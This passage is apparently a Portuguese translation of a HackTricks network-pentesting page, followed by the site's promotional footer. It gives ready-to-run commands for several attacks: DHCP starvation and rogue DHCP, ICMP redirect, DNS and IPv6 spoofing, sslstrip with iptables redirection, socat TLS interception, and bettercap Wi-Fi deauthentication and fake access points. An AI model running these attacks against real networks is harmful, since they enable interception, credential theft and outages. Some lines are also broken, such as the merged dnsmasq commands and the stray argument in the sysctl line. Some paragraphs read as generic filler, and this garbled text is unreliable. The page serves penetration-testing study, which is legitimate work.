|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Existem dois tipos de DoS que podem ser realizados contra servidores DHCP. O primeiro consiste em **simular hosts falsos suficientes para usar todos os possíveis endereços IP**.\
Este ataque só funcionará se você puder ver as respostas do servidor DHCP e completar o protocolo (**Discover** (Comp) --> **Offer** (servidor) --> **Request** (Comp) --> **ACK** (servidor)). Por exemplo, isso **não é possível em redes Wi-Fi**.

Outra maneira de realizar um DoS DHCP é enviar um **pacote DHCP-RELEASE usando como código de origem todos os IPs possíveis**. Em seguida, o servidor pensará que todos terminaram de usar o IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Uma maneira mais automática de fazer isso é usando a ferramenta [DHCPing](https://github.com/kamorin/DHCPig)

Você pode usar os ataques de DoS mencionados para forçar os clientes a obterem novos leases dentro do ambiente e esgotar os servidores legítimos para que eles fiquem inoperantes. Assim, quando os legítimos tentarem se reconectar, **você pode fornecer valores maliciosos mencionados no próximo ataque**.

#### Definir valores maliciosos

Você pode usar o script DHCP do Responder (_/usr/share/responder/DHCP.py_) para estabelecer um servidor DHCP falso. Definir um gateway malicioso não é ideal, pois a conexão sequestrada é apenas meio-duplex (ou seja, capturamos pacotes de saída do cliente, mas não as respostas do gateway legítimo). Portanto, eu recomendaria definir um servidor DNS ou WPAD falso para capturar o tráfego HTTP e, em particular, as credenciais.

| Descrição                                 | Exemplo                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Nosso endereço IP, anunciado como um gateway     | _-i 10.0.0.100_                                                              |
| O nome de domínio DNS local (opcional)        | _-d example.org_                                                             |
| Endereço IP do roteador/gateway original   | _-r 10.0.0.1_                                                                |
| Endereço IP do servidor DNS primário               | _-p 10.0.0.100_                                                              |
| Endereço IP do servidor DNS secundário (opcional)  | _-s 10.0.0.1_                                                                |
| A máscara de rede local            | _-n 255.255.255.0_                                                           |
| A interface para ouvir o tráfego DHCP | _-I eth1_                                                                    |
| Endereço de configuração WPAD (URL)            | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Falsificar o endereço IP do gateway padrão        | -S                                                                           |
| Responder a todas as solicitações DHCP (muito barulhento)   | -R                                                                           |

### **Ataques EAP**

Aqui estão algumas táticas de ataque que podem ser usadas contra implementações 802.1X:

* Força bruta ativa de senhas via EAP
* Atacar o servidor RADIUS com conteúdo EAP malformado _\*\*_(exploits)
* Captura de mensagens EAP e quebra offline de senhas (EAP-MD5 e PEAP)
* Forçar autenticação EAP-MD5 para ignorar a validação do certificado TLS
* Injetar tráfego de rede malicioso ao se autenticar usando um hub ou similar

Se o atacante estiver entre a vítima e o servidor de autenticação, ele pode tentar degradar (se necessário) o protocolo de autenticação para EAP-MD5 e capturar a tentativa de autenticação. Em seguida, ele pode realizar uma força bruta nisso usando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Ataques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (Protocolo de Redundância do Primeiro Salto) é uma classe de protocolos de rede projetados para **criar um sistema de roteamento redundante e ativo**. Com o FHRP, roteadores físicos podem ser combinados em um único dispositivo lógico, o que aumenta a tolerância a falhas e ajuda a distribuir a carga.

**Engenheiros da Cisco Systems desenvolveram dois protocolos FHRP, GLBP e HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Existem três versões do Protocolo de Informações de Roteamento (RIP) - RIP, RIPv2 e RIPng. RIP e RIPv2 usam datagramas UDP enviados para pares através da porta 520, enquanto o RIPng transmite datagramas para a porta UDP 521 via multicast IPv6. O RIPv2 introduziu suporte à autenticação MD5. O RIPng não incorpora autenticação nativa; em vez disso, depende dos cabeçalhos opcionais IPsec AH e ESP dentro do IPv6.

Para obter mais informações sobre como atacar esse protocolo, consulte o livro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Ataques EIGRP

**EIGRP (Protocolo de Roteamento de Gateway Interno Aprimorado)** é um protocolo de roteamento dinâmico. **É um protocolo de vetor de distância.** Se não houver autenticação e configuração de interfaces passivas, um **intruso** pode interferir no roteamento EIGRP e causar **envenenamento das tabelas de roteamento**. Além disso, a rede EIGRP (ou seja, sistema autônomo) **é plana e não possui segmentação em zonas**. Se um **atacante injetar uma rota**, é provável que essa rota se **espalhe** por todo o sistema autônomo EIGRP.

Para atacar um sistema EIGRP, é necessário **estabelecer uma vizinhança com um roteador EIGRP legítimo**, o que abre muitas possibilidades, desde reconhecimento básico até várias injeções.

\*\*\*\*[**FRRouting**](https://frrouting.org/) permite que você implemente **um roteador virtual que suporta BGP, OSPF, EIGRP, RIP e outros protocolos.** Tudo que você precisa fazer é implantá-lo em seu sistema de ataque e você pode fingir ser um roteador legítimo no domínio de roteamento.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) também suporta a captura de transmissões EIGRP e a injeção de pacotes para manipular a configuração de roteamento. Para mais informações sobre como atacá-lo com o Coly, consulte o livro _**Network Security Assessment: Know Your Network (3rd edition).**_

### OSPF

A maioria das implementações do Open Shortest Path First (OSPF) usa MD5 para fornecer autenticação entre roteadores. Loki e John the Ripper podem capturar e atacar hashes MD5 para revelar a chave, que pode então ser usada para anunciar novas rotas. Os parâmetros de rota são definidos usando a guia _Injection_, e a chave é definida em _Connection_.

Para obter mais informações sobre como atacar esse protocolo, consulte o livro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Outras Ferramentas e Fontes Genéricas

* [**Above**](https://github.com/c4s73r/Above): Ferramenta para escanear o tráfego de rede e encontrar vulnerabilidades
* Você pode encontrar mais informações sobre ataques de rede [aqui](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Leia tudo e todos os novos ataques, se houver)_

## **Spoofing**

O atacante configura todos os parâmetros de rede (GW, IP, DNS) do novo membro da rede enviando respostas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Verifique a [seção anterior](./#arp-spoofing).

### ICMPRedirect

O ICMP Redirect consiste em enviar um pacote ICMP tipo 1 código 5 que indica que o atacante é a melhor maneira de alcançar um IP. Em seguida, quando a vítima deseja entrar em contato com o IP, ela enviará o pacote através do atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

O atacante irá falsificar (spoof) alguns (ou todos) os domínios que a vítima solicitar.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar seu próprio DNS com dnsmasq**

O dnsmasq é uma ferramenta útil para configurar um servidor DNS local em seu ambiente de teste. Ele permite que você resolva nomes de domínio para endereços IP personalizados, o que pode ser útil durante testes de penetração. Siga as etapas abaixo para configurar seu próprio DNS com o dnsmasq:

1. **Instalação do dnsmasq:**
   - No Ubuntu: `sudo apt-get install dnsmasq`
   - No CentOS: `sudo yum install dnsmasq`

2. **Configuração do dnsmasq:**
   - Edite o arquivo de configuração do dnsmasq: `sudo nano /etc/dnsmasq.conf`
   - Adicione as seguintes linhas ao arquivo de configuração:
     ```
     address=/example.com/192.168.0.100
     address=/www.example.com/192.168.0.100
     ```
     Substitua `example.com` pelo domínio que deseja redirecionar e `192.168.0.100` pelo endereço IP personalizado para esse domínio.

3. **Reinicie o dnsmasq:**
   - No Ubuntu: `sudo systemctl restart dnsmasq`
   - No CentOS: `sudo service dnsmasq restart`

4. **Configuração do cliente:**
   - Abra o arquivo `/etc/resolv.conf` no cliente e adicione a seguinte linha:
     ```
     nameserver 127.0.0.1
     ```
     Isso direcionará as consultas DNS para o servidor DNS local configurado pelo dnsmasq.

Agora você configurou com sucesso seu próprio servidor DNS local usando o dnsmasq. Você pode testar a resolução de nomes de domínio usando o comando `nslookup` ou navegando para o domínio personalizado em um navegador da web. Certifique-se de que o dnsmasq esteja em execução e funcionando corretamente antes de prosseguir com seus testes de penetração.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateways Locais

Frequentemente, existem várias rotas para sistemas e redes. Ao criar uma lista de endereços MAC na rede local, use o _gateway-finder.py_ para identificar hosts que suportam o encaminhamento IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Falsificação de LLMNR, NBT-NS e mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Os sistemas da Microsoft usam o Link-Local Multicast Name Resolution (LLMNR) e o NetBIOS Name Service (NBT-NS) para resolução local de hosts quando as consultas DNS falham. As implementações zero-configuration do Apple Bonjour e do Linux usam o Multicast DNS (mDNS) para descobrir sistemas em uma rede. Esses protocolos são não autenticados e enviam mensagens de broadcast por UDP; assim, os atacantes podem explorá-los para direcionar os usuários para serviços maliciosos.

Você pode se passar por serviços que são procurados pelos hosts usando o Responder para enviar respostas falsas.\
Leia aqui mais informações sobre [como se passar por serviços com o Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsificação de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Muitos navegadores usam o Web Proxy Auto-Discovery (WPAD) para carregar as configurações de proxy da rede. Um servidor WPAD fornece as configurações de proxy do cliente por meio de uma URL específica (por exemplo, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) ao ser identificado por meio de qualquer um dos seguintes métodos:

* DHCP, usando uma entrada de código 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, procurando pelo nome de host _wpad_ no domínio local
* Microsoft LLMNR e NBT-NS (no caso de falha na consulta DNS)

O Responder automatiza o ataque WPAD - executando um proxy e direcionando os clientes para um servidor WPAD malicioso por meio do DHCP, DNS, LLMNR e NBT-NS.\
Leia aqui mais informações sobre [como se passar por serviços com o Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsificação de dispositivos SSDP e UPnP](spoofing-ssdp-and-upnp-devices.md)

Você pode oferecer diferentes serviços na rede para tentar **enganar um usuário** a inserir algumas **credenciais em texto simples**. **Mais informações sobre esse ataque em** [**Falsificação de dispositivos SSDP e UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Falsificação de Vizinho IPv6

Esse ataque é muito semelhante ao ARP Spoofing, mas no mundo IPv6. Você pode fazer a vítima pensar que o IPv6 do GW tem o MAC do atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding de Anúncio de Roteador IPv6

Alguns sistemas operacionais configuram por padrão o gateway a partir dos pacotes RA enviados na rede. Para declarar o atacante como roteador IPv6, você pode usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing de DHCP IPv6

Por padrão, alguns sistemas operacionais tentam configurar o DNS lendo um pacote DHCPv6 na rede. Assim, um atacante poderia enviar um pacote DHCPv6 para se configurar como DNS. O DHCP também fornece um endereço IPv6 para a vítima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (página falsa e injeção de código JS)

## Ataques na Internet

### sslStrip

Basicamente, o que esse ataque faz é, caso o **usuário** tente **acessar** uma **página HTTP** que está **redirecionando** para a versão **HTTPS**, o **sslStrip** irá **manter** uma **conexão HTTP com** o **cliente e uma conexão HTTPS com** o **servidor**, permitindo assim **capturar** a conexão em **texto simples**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mais informações [aqui](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ e dns2proxy para contornar o HSTS

A **diferença** entre **sslStrip+ e dns2proxy** em relação ao **sslStrip** é que eles irão **redirecionar** por exemplo _**www.facebook.com**_ **para** _**wwww.facebook.com**_ (observe o **extra** "**w**") e definirão o **endereço deste domínio como o IP do atacante**. Dessa forma, o **cliente** irá **conectar-se** a _**wwww.facebook.com**_ **(o atacante)**, mas nos bastidores o **sslstrip+** irá **manter** a **conexão real** via https com **www.facebook.com**.

O **objetivo** dessa técnica é **evitar o HSTS** porque _**wwww**.facebook.com_ **não será** salvo no **cache** do navegador, então o navegador será enganado para realizar a **autenticação do Facebook em HTTP**.\
Observe que, para realizar esse ataque, a vítima precisa tentar acessar inicialmente [http://www.faceook.com](http://www.faceook.com) e não https. Isso pode ser feito modificando os links dentro de uma página http.

Mais informações [aqui](https://www.bettercap.org/legacy/#hsts-bypass), [aqui](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [aqui](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ não funcionam mais. Isso ocorre porque existem regras HSTS pré-salvas nos navegadores, então mesmo que seja a primeira vez que um usuário acesse um domínio "importante", ele o acessará via HTTPS. Além disso, observe que as regras pré-salvas e outras regras geradas podem usar a flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **então o exemplo anterior de** _**wwww.facebook.com**_ **não funcionará mais, pois** _**facebook.com**_ **usa HSTS com `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Escuta TCP na porta
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL escutando na porta

#### Gerar chaves e certificado autoassinado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ouvir usando certificado

Para realizar uma escuta usando um certificado, siga os passos abaixo:

1. Obtenha um certificado válido que corresponda ao alvo que você deseja escutar.
2. Configure o ambiente de escuta para usar o certificado obtido.
3. Inicie a escuta usando o certificado.

Ao usar um certificado válido, você pode realizar uma escuta de forma segura e autenticada, garantindo a confidencialidade e integridade das informações obtidas. Certifique-se de seguir as práticas recomendadas e as políticas de segurança ao realizar essa atividade.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ouvir usando certificado e redirecionar para os hosts

Para realizar um teste de penetração em uma rede, é possível usar um certificado para ouvir o tráfego de rede e redirecioná-lo para os hosts desejados. Isso permite que você analise o tráfego em tempo real e identifique possíveis vulnerabilidades ou atividades suspeitas.

Para começar, você precisará gerar um certificado válido para o domínio que deseja ouvir. Isso pode ser feito usando ferramentas como o OpenSSL. Certifique-se de que o certificado seja confiável e válido para evitar problemas de segurança.

Depois de ter o certificado, você pode configurar um servidor proxy reverso para ouvir o tráfego de rede. Isso pode ser feito usando ferramentas como o Nginx ou o Apache. Certifique-se de configurar corretamente o servidor proxy reverso para usar o certificado gerado anteriormente.

Uma vez que o servidor proxy reverso esteja configurado, você pode redirecionar o tráfego de rede para os hosts desejados. Isso pode ser feito usando regras de redirecionamento no servidor proxy reverso. Certifique-se de configurar as regras corretamente para redirecionar o tráfego para os hosts específicos que você deseja analisar.

Ao ouvir o tráfego de rede usando um certificado e redirecioná-lo para os hosts desejados, você poderá analisar o tráfego em tempo real e identificar possíveis vulnerabilidades ou atividades suspeitas. Isso pode ser útil durante um teste de penetração para identificar pontos fracos na segurança da rede.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Às vezes, se o cliente verifica se o CA é válido, você pode **servir um certificado de outro nome de host assinado por um CA**.\
Outro teste interessante é servir um **certificado do nome de host solicitado, mas autoassinado**.

Outras coisas para testar são tentar assinar o certificado com um certificado válido que não seja um CA válido. Ou usar a chave pública válida, forçar o uso de um algoritmo como o Diffie-Hellman (que não precisa descriptografar nada com a chave privada real) e quando o cliente solicitar uma sonda da chave privada real (como um hash), enviar uma sonda falsa e esperar que o cliente não verifique isso.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descoberta Ativa

Tenha em mente que quando um pacote UDP é enviado para um dispositivo que não possui a porta solicitada, um ICMP (Porta Inacessível) é enviado.

### **Descoberta ARP**

Pacotes ARP são usados para descobrir quais IPs estão sendo usados dentro da rede. O PC precisa enviar uma solicitação para cada endereço IP possível e apenas aqueles que estão sendo usados irão responder.

### **mDNS (multicast DNS)**

O Bettercap envia uma solicitação mDNS (a cada X ms) perguntando por **\_services\_.dns-sd.\_udp.local**. A máquina que vê esse pacote geralmente responde a essa solicitação. Em seguida, ele procura apenas por máquinas que respondem a "serviços".

**Ferramentas**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

O Bettercap envia pacotes de broadcast para a porta 137/UDP perguntando pelo nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

O Bettercap envia pacotes SSDP de broadcast procurando por todos os tipos de serviços (Porta UDP 1900).

### **WSD (Web Service Discovery)**

O Bettercap envia pacotes WSD de broadcast procurando por serviços (Porta UDP 3702).

## Referências

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Dica de recompensa por bugs**: **inscreva-se** no **Intigriti**, uma plataforma premium de **recompensas por bugs criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
